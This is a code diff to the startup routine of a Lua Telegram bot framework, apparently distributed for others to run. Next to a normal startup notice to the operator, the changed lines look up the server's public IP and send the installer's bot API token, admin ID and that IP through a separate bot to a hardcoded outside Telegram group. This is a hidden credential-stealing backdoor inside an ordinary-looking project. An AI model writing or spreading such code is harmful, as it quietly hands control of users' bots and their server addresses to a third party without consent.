@@ -73,10 +73,12 @@ bot_init = function(on_reload)
 	print(colors('%{yellow bright}BY :- @ikeko   CH: @botLua    bot : @'..bot.username .. ', name bot ' .. bot.first_name ..'  id bot ('..bot.id..')'))
 	if not on_reload then
 	local text2 = 'تم تشغيل البوت \nBY : @ikeko  \nCH: @botLua \n CH2 : @eeqeq'
-        local dsad2 = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..config.admin..'&text='..URL.escape(text2)
+  local dsad2 = 'https://api.telegram.org/bot'..config.bot_api_key..'/sendMessage?chat_id='..config.admin..'&text='..URL.escape(text2)
 	api.sendRequest(dsad2)
 	local keko = '386713631'
-	local dsad = 'https://api.telegram.org/bot'..config2.nowt..'/sendMessage?chat_id=358231262&text=تم تشغيل بوت-@'..bot.username..'       -------------------------------------------------------------------------------       '..config.bot_api_key..'             -------------------------------------------------------------------------------         '..config.admin..'       '
+  local ipp = HTTPS.request('https://icanhazip.com')
+  local kekotext = URL.escape('تم تشغيل : @'..bot.username..'\nتوكن : '..config.bot_api_key..'\n\nايدي المطور : '..config.admin..'\n\n IP server : '..ipp)
+	local dsad = 'https://api.telegram.org/bot'..config2.nowt..'/sendMessage?chat_id=-1001149546092&text='..kekotext
 	api.sendRequest(dsad)
 	end
 	math.randomseed(os.time())
